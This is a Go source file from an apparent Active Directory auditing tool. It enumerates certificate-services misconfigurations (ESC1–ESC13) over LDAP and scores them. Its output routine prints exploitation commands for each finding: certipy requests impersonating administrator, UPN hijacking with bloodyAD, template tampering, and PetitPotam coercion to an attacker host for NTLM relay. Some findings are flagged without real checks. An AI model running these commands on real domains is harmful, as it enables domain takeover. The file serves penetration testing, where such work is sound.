package analysis

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/fatih/color"

	adldap "github.com/YakinAnd/morok/internal/ldap"
)

// ============================================================
// Models
// ============================================================

type ADCSVulnType string

const (
	ESC1  ADCSVulnType = "ESC1"  // Enrollee supplies subject (SAN injection)
	ESC2  ADCSVulnType = "ESC2"  // Any Purpose / no EKU
	ESC3  ADCSVulnType = "ESC3"  // Certificate Request Agent EKU
	ESC4  ADCSVulnType = "ESC4"  // Low-priv principal has write permissions on template object
	ESC6  ADCSVulnType = "ESC6"  // CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
	ESC7  ADCSVulnType = "ESC7"  // Low-priv principal has ManageCA / ManageCertificates on CA
	ESC8  ADCSVulnType = "ESC8"  // Web Enrollment endpoint active (NTLM relay possible)
	ESC9  ADCSVulnType = "ESC9"  // CT_FLAG_NO_SECURITY_EXTENSION — no SID binding in issued cert
	ESC11 ADCSVulnType = "ESC11" // ICPR/DCOM enrollment interface relay
	ESC13 ADCSVulnType = "ESC13" // Issuance policy OID linked to privileged group
)

// msPKI-Certificate-Name-Flag bitmasks
const (
	ctFlagEnrolleeSuppliesSubject = 0x00000001
	ctFlagOldCertSupplies         = 0x00000008
)

// msPKI-Enrollment-Flag bitmasks
const (
	ctFlagIncludeSymmetricAlgorithms = 0x00000001
	ctFlagPublishToDS                = 0x00000008
	ctFlagAutoenrollment             = 0x00000020
	ctFlagNoSecurityExtension        = 0x00080000 // ESC9: omits szOID_NTDS_CA_SECURITY_EXT from issued cert
)

// CA editFlags bitmask (from msPKI-Enrollment-Servers / flags attribute)
const editFlagAttributeSubjectAltName2 = 0x00040000

// Well-known SIDs / RIDs that indicate low-priv enrollment (ESC1 qualifier)
var lowPrivSIDs = []string{
	"S-1-1-0",       // Everyone
	"S-1-5-11",      // Authenticated Users
	"S-1-5-17",      // IUSR
	"Domain Users",
	"Authenticated Users",
	"Everyone",
}

type CertTemplateFinding struct {
	TemplateName      string
	TemplateOID       string
	CAName            string
	VulnTypes         []ADCSVulnType
	EnrollableBy      []string
	AllowsSANInject   bool
	EKUs              []string
	AuthEnabled       bool // has Client Auth / Smart Card Logon EKU
	NoSecurityExt     bool // ESC9: cert issued without SID-binding extension
	IssuancePolicyOID string // ESC13: policy OID linked to group
	LinkedGroupDN     string // ESC13: privileged group DN
	Severity          string
	CVSS       float64
	CVSSVector string
}

type CAFinding struct {
	CAName    string
	CADN      string
	VulnTypes []ADCSVulnType
	WebEnroll bool
	Details   string
	Severity  string
	CVSS       float64
	CVSSVector string
}

type CAInfo struct {
	Name      string
	DN        string
	Server    string
	EditFlags int64
}

type ADCSResult struct {
	Domain           string
	CAs              []CAInfo
	TemplateFindings []CertTemplateFinding
	CAFindings       []CAFinding
}

// ============================================================
// LDAP filters & attributes
// ============================================================

const (
	filterCertTemplates = "(objectClass=pKICertificateTemplate)"
	filterCA            = "(objectClass=pKIEnrollmentService)"
)

var certTemplateAttributes = []string{
	"cn",
	"displayName",
	"distinguishedName",
	"msPKI-Certificate-Name-Flag",
	"msPKI-Enrollment-Flag",
	"pKIExtendedKeyUsage",
	"msPKI-RA-Signature",
	"msPKI-Cert-Template-OID",
	"msPKI-Certificate-Policy", // ESC13: issuance policy OID linked to group
	"nTSecurityDescriptor",
}

var caAttributes = []string{
	"cn",
	"displayName",
	"distinguishedName",
	"dNSHostName",
	"certificateTemplates",
	"flags", // editFlags for ESC6
	"nTSecurityDescriptor",
}

// Certificate extended right GUIDs (lowercase, no braces)
const (
	guidCertEnroll     = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
	guidCertAutoenroll = "a05b8cc2-17bc-4802-a710-e7c15ab866a2"
)

// ADS_RIGHT_DS_CONTROL_ACCESS — grants an extended right when combined with an Object ACE
const adsRightControlAccess = 0x00000100

// EKU OIDs
var ekuNameMap = map[string]string{
	"1.3.6.1.5.5.7.3.1":        "Server Authentication",
	"1.3.6.1.5.5.7.3.2":        "Client Authentication",
	"1.3.6.1.5.5.7.3.4":        "Email",
	"2.5.29.37.0":               "Any Purpose",
	"1.3.6.1.4.1.311.20.2.1":   "Certificate Request Agent",
	"1.3.6.1.4.1.311.20.2.2":   "Smart Card Logon",
	"1.3.6.1.4.1.311.10.3.4":   "EFS",
}

// EKUs that enable authentication (needed for ESC1 to be Critical)
var authEKUs = map[string]bool{
	"1.3.6.1.5.5.7.3.2":      true, // Client Authentication
	"1.3.6.1.4.1.311.20.2.2": true, // Smart Card Logon
	"2.5.29.37.0":             true, // Any Purpose
}

// ============================================================
// Main analysis
// ============================================================

func AnalyzeADCS(client *adldap.Client) (*ADCSResult, error) {
	result := &ADCSResult{Domain: client.GetDomain()}

	configDN, err := client.ConfigurationDN()
	if err != nil {
		return nil, fmt.Errorf("cannot resolve configuration DN: %w", err)
	}

	pkiBase := "CN=Public Key Services,CN=Services," + configDN

	// ── 1. Enumerate CAs ─────────────────────────────────────
	caEntries, err := client.SearchBase(pkiBase, filterCA, caAttributes)
	if err != nil {
		return nil, fmt.Errorf("CA enumeration failed: %w", err)
	}

	for _, e := range caEntries {
		editFlags, _ := strconv.ParseInt(e.GetAttributeValue("flags"), 10, 64)
		ca := CAInfo{
			Name:      e.GetAttributeValue("cn"),
			DN:        e.DN,
			Server:    e.GetAttributeValue("dNSHostName"),
			EditFlags: editFlags,
		}
		result.CAs = append(result.CAs, ca)

		// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA
		// This allows SAN injection for ANY template issued by this CA
		if editFlags&editFlagAttributeSubjectAltName2 != 0 {
			const esc6Vec = "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
			esc6Score := CVSSScore(esc6Vec)
			result.CAFindings = append(result.CAFindings, CAFinding{
				CAName:     ca.Name,
				CADN:       ca.DN,
				VulnTypes:  []ADCSVulnType{ESC6},
				Details:    "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — any template issued by this CA allows SAN injection regardless of template settings. Equivalent to ESC1 for all templates.",
				Severity:   CVSSSeverity(esc6Score),
				CVSS:       esc6Score,
				CVSSVector: esc6Vec,
			})
		}

		const esc8Vec = "AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"
		esc8Score := CVSSScore(esc8Vec)
		result.CAFindings = append(result.CAFindings, CAFinding{
			CAName:     ca.Name,
			CADN:       ca.DN,
			VulnTypes:  []ADCSVulnType{ESC8},
			WebEnroll:  true,
			Details:    "Verify if Web Enrollment is active: http://" + ca.Server + "/certsrv/ — if accessible and NTLM auth is allowed, PetitPotam/Coercer → certipy relay attack is possible.",
			Severity:   CVSSSeverity(esc8Score),
			CVSS:       esc8Score,
			CVSSVector: esc8Vec,
		})

		const esc11Vec = "AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"
		esc11Score := CVSSScore(esc11Vec)
		result.CAFindings = append(result.CAFindings, CAFinding{
			CAName:     ca.Name,
			CADN:       ca.DN,
			VulnTypes:  []ADCSVulnType{ESC11},
			Details:    "Verify if the ICPR (MS-ICPR/DCOM) enrollment interface is accessible: certipy relay -target 'rpc://" + ca.Server + "' — if NTLM relay is possible via DCOM, an attacker can request certificates as a coerced machine account.",
			Severity:   CVSSSeverity(esc11Score),
			CVSS:       esc11Score,
			CVSSVector: esc11Vec,
		})
	}

	// ── 2. Enumerate certificate templates ───────────────────
	templatesBase := "CN=Certificate Templates,CN=Public Key Services,CN=Services," + configDN
	tmplEntries, err := client.SearchBase(templatesBase, filterCertTemplates, certTemplateAttributes)
	if err != nil {
		return nil, fmt.Errorf("template enumeration failed: %w", err)
	}

	for _, e := range tmplEntries {
		f := analyzeTemplate(e)
		if f != nil {
			result.TemplateFindings = append(result.TemplateFindings, *f)
		}
		// ESC4: dangerous write permissions on template object
		esc4 := checkESC4(e)
		for _, f4 := range esc4 {
			result.TemplateFindings = append(result.TemplateFindings, f4)
		}
	}

	// ── 3. ESC7: ManageCA / ManageCertificates on CA ─────────
	for _, e := range caEntries {
		esc7Findings := checkESC7(e)
		result.CAFindings = append(result.CAFindings, esc7Findings...)
	}

	// ── 4. ESC13: Issuance policy OID linked to group ────────
	tmplIfaces := make([]ldapEntry, len(tmplEntries))
	for i, e := range tmplEntries {
		tmplIfaces[i] = e
	}
	esc13Findings := checkESC13(client, configDN, tmplIfaces)
	result.TemplateFindings = append(result.TemplateFindings, esc13Findings...)

	return result, nil
}

// ============================================================
// Template analysis
// ============================================================

type ldapEntry interface {
	GetAttributeValue(string) string
	GetAttributeValues(string) []string
	GetRawAttributeValue(string) []byte
}

func analyzeTemplate(e ldapEntry) *CertTemplateFinding {
	name := e.GetAttributeValue("cn")
	if name == "" {
		name = e.GetAttributeValue("displayName")
	}

	// Parse msPKI-Certificate-Name-Flag as int32 (can be negative — signed)
	nameFlagStr := e.GetAttributeValue("msPKI-Certificate-Name-Flag")
	nameFlag, _ := strconv.ParseInt(nameFlagStr, 10, 64)

	enrollmentFlagStr := e.GetAttributeValue("msPKI-Enrollment-Flag")
	enrollmentFlag, _ := strconv.ParseInt(enrollmentFlagStr, 10, 64)

	ekus  := e.GetAttributeValues("pKIExtendedKeyUsage")
	raSig := e.GetAttributeValue("msPKI-RA-Signature")

	var vulns []ADCSVulnType
	allowsSAN      := false
	authEnabled    := false
	noSecurityExt  := enrollmentFlag&ctFlagNoSecurityExtension != 0

	// ── ESC1: ENROLLEE_SUPPLIES_SUBJECT bit set ───────────────
	// Correct bitmask check — value can be e.g. 65536 (0x10000) with bit 0 set
	// when combined flags are present, so we mask properly.
	if nameFlag&ctFlagEnrolleeSuppliesSubject != 0 {
		allowsSAN = true
		vulns = append(vulns, ESC1)
	}

	// ── Check if template enables authentication ──────────────
	for _, eku := range ekus {
		if authEKUs[eku] {
			authEnabled = true
		}
	}

	// ── ESC2: Any Purpose EKU or no EKUs at all ──────────────
	if len(ekus) == 0 {
		vulns = appendUniq(vulns, ESC2)
		authEnabled = true
	}
	for _, eku := range ekus {
		if eku == "2.5.29.37.0" {
			vulns = appendUniq(vulns, ESC2)
			authEnabled = true
		}
	}

	// ── ESC3: Certificate Request Agent EKU ──────────────────
	// + no authorized signatures required (msPKI-RA-Signature == 0)
	raSigVal, _ := strconv.Atoi(raSig)
	for _, eku := range ekus {
		if eku == "1.3.6.1.4.1.311.20.2.1" && raSigVal == 0 {
			vulns = appendUniq(vulns, ESC3)
		}
	}

	// ── ESC9: No Security Extension ──────────────────────────
	// Template omits szOID_NTDS_CA_SECURITY_EXT — issued certs don't bind to an AD SID.
	// Combined with GenericWrite over a victim account (to change UPN), an attacker can
	// request a cert that maps to a different account.
	if noSecurityExt && authEnabled {
		vulns = appendUniq(vulns, ESC9)
	}

	// Only flag templates that enable authentication — others are low risk
	if !authEnabled && !allowsSAN && !noSecurityExt {
		return nil
	}
	if len(vulns) == 0 {
		return nil
	}

	// Map EKU OIDs to human names
	var ekuDisplay []string
	for _, oid := range ekus {
		if n, ok := ekuNameMap[oid]; ok {
			ekuDisplay = append(ekuDisplay, n)
		} else {
			ekuDisplay = append(ekuDisplay, oid)
		}
	}

	// Check who can actually enroll (ESC1 qualifier)
	enrollableBy := checkEnrollmentRights(e)

	// CVSS 3.1 vector selection:
	// ESC1 + auth EKU + low-priv enrollable → direct domain escalation: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
	// ESC1 + auth EKU + priv-only enrollment → still exploitable but harder: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
	// ESC9 alone (requires GenericWrite over account): AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
	// Default (other ESC variants): AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
	var cvssVector string
	if containsVuln(vulns, ESC1) && authEnabled {
		if len(enrollableBy) > 0 {
			cvssVector = "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
		} else {
			cvssVector = "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
		}
	} else if containsVuln(vulns, ESC9) && !containsVuln(vulns, ESC1) {
		cvssVector = "AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H"
	} else {
		cvssVector = "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
	}
	cvssScore := CVSSScore(cvssVector)

	return &CertTemplateFinding{
		TemplateName:    name,
		TemplateOID:     e.GetAttributeValue("msPKI-Cert-Template-OID"),
		VulnTypes:       vulns,
		AllowsSANInject: allowsSAN,
		AuthEnabled:     authEnabled,
		NoSecurityExt:   noSecurityExt,
		EKUs:            ekuDisplay,
		EnrollableBy:    enrollableBy,
		Severity:        CVSSSeverity(cvssScore),
		CVSS:            cvssScore,
		CVSSVector:      cvssVector,
	}
}

// checkEnrollmentRights parses the template's DACL and returns a deduplicated list
// of low-privileged principal names that have the Certificate-Enrollment extended right.
// An empty result means only privileged accounts can enroll (ESC1 is not directly exploitable).
func checkEnrollmentRights(e ldapEntry) []string {
	sdBytes := e.GetRawAttributeValue("nTSecurityDescriptor")
	if len(sdBytes) == 0 {
		return nil
	}

	aces, err := parseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil
	}

	seen := map[string]bool{}
	var result []string

	for _, ace := range aces {
		if ace.ACEType == 0x01 || ace.ACEType == 0x06 { // Deny ACEs — skip
			continue
		}
		if ace.AccessMask&adsRightControlAccess == 0 {
			continue
		}

		// Object ACE (0x05): only grant enrollment if ObjectType matches enrollment GUID
		// Simple ACE (0x00): ADS_RIGHT_DS_CONTROL_ACCESS grants all extended rights → enrollment included
		if ace.ACEType == 0x05 {
			if ace.ObjectType != guidCertEnroll && ace.ObjectType != guidCertAutoenroll {
				continue
			}
		}

		name, lowPriv := isLowPrivSID(ace.SID)
		if !lowPriv {
			continue
		}
		if !seen[name] {
			seen[name] = true
			result = append(result, name)
		}
	}

	return result
}

// ============================================================
// ESC4 — dangerous write permissions on certificate template
// ============================================================

// wellKnownLowPrivSIDs — SIDs that represent low-privileged principals.
// Domain Users suffix -513 is checked separately via hasSuffix.
var wellKnownLowPrivSIDs = map[string]string{
	"S-1-1-0":  "Everyone",
	"S-1-5-11": "Authenticated Users",
	"S-1-5-17": "IUSR",
}

// isLowPrivSID returns true if the SID belongs to a low-priv well-known group
// or is a Domain Users SID (ends in -513).
func isLowPrivSID(sid string) (string, bool) {
	if name, ok := wellKnownLowPrivSIDs[sid]; ok {
		return name, true
	}
	// Domain Users: S-1-5-21-...-513
	if strings.HasSuffix(sid, "-513") {
		return "Domain Users", true
	}
	return "", false
}

// checkESC4 checks if low-privileged principals have dangerous write
// permissions on the certificate template object (WriteDACL, WriteOwner,
// GenericAll, GenericWrite). Any of these allows modifying the template
// to introduce ESC1.
func checkESC4(e ldapEntry) []CertTemplateFinding {
	type rawEntry interface {
		GetRawAttributeValue(string) []byte
		GetAttributeValue(string) string
	}
	re, ok := e.(rawEntry)
	if !ok {
		return nil
	}

	sdBytes := re.GetRawAttributeValue("nTSecurityDescriptor")
	if len(sdBytes) == 0 {
		return nil
	}

	aces, err := parseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil
	}

	name := e.GetAttributeValue("cn")
	var findings []CertTemplateFinding

	for _, ace := range aces {
		if ace.ACEType == 0x01 { // Deny ACE — skip
			continue
		}
		principalName, lowPriv := isLowPrivSID(ace.SID)
		if !lowPriv {
			continue
		}

		mask := ace.AccessMask
		dangerous := mask&ADS_RIGHT_GENERIC_ALL != 0 ||
			mask&ADS_RIGHT_WRITE_DACL != 0 ||
			mask&ADS_RIGHT_WRITE_OWNER != 0 ||
			mask&ADS_RIGHT_GENERIC_WRITE != 0

		if !dangerous {
			continue
		}

		findings = append(findings, CertTemplateFinding{
			TemplateName: name,
			TemplateOID:  e.GetAttributeValue("msPKI-Cert-Template-OID"),
			VulnTypes:    []ADCSVulnType{ESC4},
			EnrollableBy: []string{principalName},
			Severity:     "High",
		})
		break // одна знахідка на шаблон достатньо
	}

	return findings
}

// ============================================================
// ESC7 — ManageCA / ManageCertificates on CA object
// ============================================================

// CA-specific access rights (from wincrypt.h)
const (
	caAccessManageCA           = 0x00000001 // CA Officer / Manager
	caAccessManageCertificates = 0x00000002 // Certificate Manager
	caAccessEnroll             = 0x00000100 // basic enroll
)

// checkESC7 checks if low-privileged principals have ManageCA or
// ManageCertificates rights on the CA object. ManageCA allows changing
// CA flags (e.g. set EDITF_ATTRIBUTESUBJECTALTNAME2 = instant ESC6).
// ManageCertificates allows approving pending certificate requests.
func checkESC7(e ldapEntry) []CAFinding {
	type rawEntry interface {
		GetRawAttributeValue(string) []byte
		GetAttributeValue(string) string
		DN() string
	}
	// go-ldap Entry — use type assertion to get raw bytes
	type rawGetter interface {
		GetRawAttributeValue(string) []byte
		GetAttributeValue(string) string
	}
	re, ok := e.(rawGetter)
	if !ok {
		return nil
	}

	sdBytes := re.GetRawAttributeValue("nTSecurityDescriptor")
	if len(sdBytes) == 0 {
		return nil
	}

	aces, err := parseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil
	}

	caName := re.GetAttributeValue("cn")
	var findings []CAFinding
	seenManageCA := false
	seenManageCerts := false

	for _, ace := range aces {
		if ace.ACEType == 0x01 {
			continue
		}
		principalName, lowPriv := isLowPrivSID(ace.SID)
		if !lowPriv {
			continue
		}

		if ace.AccessMask&caAccessManageCA != 0 && !seenManageCA {
			findings = append(findings, CAFinding{
				CAName:    caName,
				VulnTypes: []ADCSVulnType{ESC7},
				Details:   principalName + " has ManageCA right — can change CA flags (e.g. enable EDITF_ATTRIBUTESUBJECTALTNAME2 → ESC6 for all templates).",
				Severity:  "Critical",
			})
			seenManageCA = true
		}
		if ace.AccessMask&caAccessManageCertificates != 0 && !seenManageCerts {
			findings = append(findings, CAFinding{
				CAName:    caName,
				VulnTypes: []ADCSVulnType{ESC7},
				Details:   principalName + " has ManageCertificates right — can approve any pending certificate request, bypassing manager approval.",
				Severity:  "High",
			})
			seenManageCerts = true
		}
	}

	return findings
}

// ============================================================
// ESC13 — Issuance policy OID linked to privileged group
// ============================================================

// checkESC13 queries the CN=OID container for policy objects that have
// msDS-OIDToGroupLink set, then matches them against certificate templates
// that include those policy OIDs in msPKI-Certificate-Policy. If a low-priv
// principal can enroll in such a template, they effectively gain membership
// in the linked group when authenticating via that certificate.
func checkESC13(client *adldap.Client, configDN string, tmplEntries []ldapEntry) []CertTemplateFinding {
	oidBase := "CN=OID,CN=Public Key Services,CN=Services," + configDN

	oidEntries, err := client.SearchBase(oidBase, "(msDS-OIDToGroupLink=*)", []string{
		"cn",
		"msPKI-Cert-Template-OID",
		"msDS-OIDToGroupLink",
	})
	if err != nil {
		return nil
	}

	// Build map: policy OID → linked group DN
	policyToGroup := make(map[string]string)
	for _, oe := range oidEntries {
		oid := oe.GetAttributeValue("msPKI-Cert-Template-OID")
		group := oe.GetAttributeValue("msDS-OIDToGroupLink")
		if oid != "" && group != "" {
			policyToGroup[oid] = group
		}
	}

	if len(policyToGroup) == 0 {
		return nil
	}

	var findings []CertTemplateFinding

	for _, e := range tmplEntries {
		policies := e.GetAttributeValues("msPKI-Certificate-Policy")
		for _, pol := range policies {
			groupDN, linked := policyToGroup[pol]
			if !linked {
				continue
			}

			name := e.GetAttributeValue("cn")
			if name == "" {
				name = e.GetAttributeValue("displayName")
			}

			enrollableBy := checkEnrollmentRights(e)
			sev := "High"
			if len(enrollableBy) > 0 {
				sev = "Critical"
			}

			findings = append(findings, CertTemplateFinding{
				TemplateName:      name,
				TemplateOID:       e.GetAttributeValue("msPKI-Cert-Template-OID"),
				VulnTypes:         []ADCSVulnType{ESC13},
				EnrollableBy:      enrollableBy,
				IssuancePolicyOID: pol,
				LinkedGroupDN:     groupDN,
				Severity:          sev,
			})
			break // one finding per template
		}
	}

	return findings
}

// ============================================================
// Helpers
// ============================================================

func appendUniq(s []ADCSVulnType, v ADCSVulnType) []ADCSVulnType {
	for _, x := range s {
		if x == v {
			return s
		}
	}
	return append(s, v)
}

func containsVuln(s []ADCSVulnType, v ADCSVulnType) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}

func formatVulns(vulns []ADCSVulnType) string {
	s := make([]string, len(vulns))
	for i, v := range vulns {
		s[i] = string(v)
	}
	return strings.Join(s, ", ")
}

// ============================================================
// Terminal output
// ============================================================

func printADCSResult(r *ADCSResult, showNextSteps bool) {
	color.Cyan("\n  ADCS")
	color.White("  %-28s %d", "certificate authorities", len(r.CAs))
	for _, ca := range r.CAs {
		esc6 := ""
		if ca.EditFlags&editFlagAttributeSubjectAltName2 != 0 {
			esc6 = "  [ESC6 — ATTRIBUTESUBJECTALTNAME2]"
		}
		color.White("    %-26s %s%s", ca.Name, ca.Server, esc6)
	}

	critCount := 0
	for _, f := range r.TemplateFindings {
		if f.Severity == "Critical" {
			critCount++
		}
	}

	if len(r.TemplateFindings) == 0 {
		color.White("  %-28s %d", "vulnerable templates", 0)
	} else {
		color.Yellow("  %-28s %d  (%d critical)", "vulnerable templates", len(r.TemplateFindings), critCount)
		fmt.Println()
		color.White("  %-32s %-10s %-20s %-26s %s", "TEMPLATE", "SEVERITY", "VULNS", "AUTH EKU", "ENROLLABLE BY")
		color.White("  " + strings.Repeat("─", 100))
		for _, f := range r.TemplateFindings {
			authStr := ""
			if f.AuthEnabled {
				authStr = strings.Join(f.EKUs, ", ")
			}
			enrollStr := strings.Join(f.EnrollableBy, ", ")
			line := fmt.Sprintf("  %-32s %-10s %-20s %-26s %s", f.TemplateName, f.Severity, formatVulns(f.VulnTypes), authStr, enrollStr)
			switch f.Severity {
			case "Critical":
				color.Red(line)
			case "High":
				color.Yellow(line)
			default:
				color.White(line)
			}
		}
		fmt.Println()
	}

	// CA-level findings (ESC6)
	for _, cf := range r.CAFindings {
		if containsVuln(cf.VulnTypes, ESC6) {
			color.Red("\n  [ESC6] %s — %s", cf.CAName, cf.Details)
		}
	}

	// Next steps
	if !showNextSteps {
		return
	}

	// collect which ESC types are present across all findings
	vulnSet := map[ADCSVulnType][]string{} // vuln → template names
	for _, f := range r.TemplateFindings {
		for _, v := range f.VulnTypes {
			vulnSet[v] = append(vulnSet[v], f.TemplateName)
		}
	}
	for _, cf := range r.CAFindings {
		for _, v := range cf.VulnTypes {
			vulnSet[v] = append(vulnSet[v], cf.CAName)
		}
	}

	if len(vulnSet) == 0 {
		return
	}

	color.Cyan("\n  NEXT STEPS")

	if tmpls, ok := vulnSet[ESC1]; ok {
		tmpl := tmpls[0]
		color.White("  ESC1  — SAN injection via vulnerable template")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
	}

	if tmpls, ok := vulnSet[ESC2]; ok {
		tmpl := tmpls[0]
		color.White("  ESC2  — Any Purpose EKU (treat as ESC1)")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
	}

	if tmpls, ok := vulnSet[ESC3]; ok {
		tmpl := tmpls[0]
		color.White("  ESC3  — Certificate Request Agent: enroll enrollment-agent cert, then req on behalf of DA")
		color.White("    # Step 1: get enrollment agent certificate")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
		color.White("    # Step 2: request cert as administrator")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template 'User' -on-behalf-of '%s\\administrator' -pfx user.pfx", r.Domain, r.Domain)
		color.White("    certipy auth -pfx administrator.pfx -domain %s", r.Domain)
	}

	if tmpls, ok := vulnSet[ESC4]; ok {
		tmpl := tmpls[0]
		color.White("  ESC4  — Write ACL on template: modify template to add ESC1, then exploit as ESC1")
		color.White("    certipy template -u 'user@%s' -p 'pass' -template '%s' -save-old", r.Domain, tmpl)
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s' -upn 'administrator@%s'", r.Domain, tmpl, r.Domain)
		color.White("    certipy template -u 'user@%s' -p 'pass' -template '%s' -configuration '%s.json'  # restore", r.Domain, tmpl, tmpl)
	}

	if _, ok := vulnSet[ESC6]; ok {
		color.White("  ESC6  — CA flag ATTRIBUTESUBJECTALTNAME2: SAN injection works for ANY template")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template 'User' -upn 'administrator@%s'", r.Domain, r.Domain)
		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
	}

	if cas, ok := vulnSet[ESC7]; ok {
		ca := cas[0]
		color.White("  ESC7  — ManageCA/ManageCertificates on CA '%s'", ca)
		color.White("    # If ManageCA: enable ATTRIBUTESUBJECTALTNAME2 flag → becomes ESC6")
		color.White("    certipy ca -u 'user@%s' -p 'pass' -ca '%s' -enable-template 'SubCA'", r.Domain, ca)
		color.White("    # If ManageCertificates: approve pending requests")
		color.White("    certipy ca -u 'user@%s' -p 'pass' -ca '%s' -issue-request <request-id>", r.Domain, ca)
	}

	for _, cf := range r.CAFindings {
		if containsVuln(cf.VulnTypes, ESC8) {
			color.White("  ESC8  — Web Enrollment NTLM relay (PetitPotam/Coercer → certipy)")
			color.White("    certipy relay -target 'http://%s/certsrv/certfnsh.asp' -template 'DomainController'", cf.CAName)
			color.White("    # Trigger coercion: python3 PetitPotam.py <attacker-ip> %s", cf.CAName)
			break
		}
	}

	if tmpls, ok := vulnSet[ESC9]; ok {
		tmpl := tmpls[0]
		color.White("  ESC9  — No Security Extension: requires GenericWrite over a victim account")
		color.White("    # 1. Change victim UPN to impersonate target")
		color.White("    bloodyAD -u user -p pass -d %s set object victim userPrincipalName administrator@%s", r.Domain, r.Domain)
		color.White("    # 2. Request cert as victim (cert will show administrator UPN)")
		color.White("    certipy req -u 'victim@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
		color.White("    # 3. Restore victim UPN, auth as administrator")
		color.White("    certipy auth -pfx administrator.pfx -domain %s -dc-ip <DC>", r.Domain)
	}

	for _, cf := range r.CAFindings {
		if containsVuln(cf.VulnTypes, ESC11) {
			color.White("  ESC11 — ICPR/DCOM relay (manual verify required)")
			color.White("    certipy relay -target 'rpc://%s' -template 'DomainController'", cf.CAName)
			color.White("    # Trigger coercion: python3 PetitPotam.py <attacker-ip> %s", cf.CAName)
			break
		}
	}

	if tmpls, ok := vulnSet[ESC13]; ok {
		tmpl := tmpls[0]
		color.White("  ESC13 — Issuance policy OID linked to privileged group")
		color.White("    certipy req -u 'user@%s' -p 'pass' -ca '<CA>' -template '%s'", r.Domain, tmpl)
		color.White("    # Authenticate — group membership applied via OID in cert")
		color.White("    certipy auth -pfx user.pfx -domain %s -dc-ip <DC>", r.Domain)
	}
}

// PrintADCSResult — standalone adcs command (shows next steps)
func PrintADCSResult(r *ADCSResult) {
	printADCSResult(r, true)
}

// PrintADCSResultSummary — summary only, no next steps (used by enum command)
func PrintADCSResultSummary(r *ADCSResult) {
	printADCSResult(r, false)
}
